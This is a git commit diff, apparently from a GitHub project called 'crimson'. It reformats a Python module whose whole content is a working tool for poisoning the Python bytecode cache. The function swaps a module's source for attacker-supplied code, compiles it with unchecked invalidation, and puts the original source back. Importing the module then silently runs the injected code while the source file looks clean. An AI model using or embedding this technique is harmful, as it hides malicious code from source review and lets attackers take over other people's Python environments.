0b5319b2e9be37d6e326c1b64bc0cc06f91b1bc8
kale <42823429+oelin@users.noreply.github.com>
2023-04-27 09:40:14 +0100

    Update __init__.py

--- crimson/__init__.py
+++ crimson/__init__.py
@@ -1,49 +1,48 @@
 """ 
- Implements cache poisoning. 
- """ 
-  
-  
- from os import rename 
- from random import random 
- from py_compile import compile 
-  
-  
- def invalidate(path: str, code: str): 
-     """ 
-     Cache poisons a Python module located at `path` such 
-         that it executes `code` instead of its own source code. 
-  
-  
-     Parameters 
-     ---------- 
-  
-     path: str 
-  
-         The path of the Python module to poison. Usually 
-         relative paths are preferred. 
-  
-     code: str 
-  
-         The code which should be executed when the poisoned 
-         module is imported. 
-     """ 
-  
-     # Create a temporary file... 
-  
-     temporary = str(random()) 
-  
-     # Move the module into the temporary file... 
-  
-     rename(path, temporary) 
-  
-     # Create a poisoned module... 
-  
-     open(path, "w").write(code) 
-  
-     # Compile it with unchecked invalidation... 
-  
-     compile(path, invalidation_mode=3) 
-  
-     # Move the original module back... 
-  
-     rename(temporary, path)
+Implements cache poisoning. 
+""" 
+
+
+from os import rename 
+from random import random 
+from py_compile import compile 
+
+
+def invalidate(path: str, code: str): 
+    """ 
+    Cache poisons a Python module located at `path` such 
+    that it executes `code` instead of its own source code. 
+    
+    Parameters 
+    ---------- 
+
+    path: str 
+
+        The path of the Python module to poison. Usually 
+        relative paths are preferred. 
+
+    code: str 
+
+        The code which should be executed when the poisoned 
+        module is imported. 
+    """ 
+
+    # Create a temporary file... 
+
+    temporary = str(random()) 
+
+    # Move the module into the temporary file... 
+
+    rename(path, temporary) 
+
+    # Create a poisoned module... 
+
+    open(path, "w").write(code) 
+
+    # Compile it with unchecked invalidation... 
+
+    compile(path, invalidation_mode=3) 
+
+    # Move the original module back... 
+
+    rename(temporary, path)
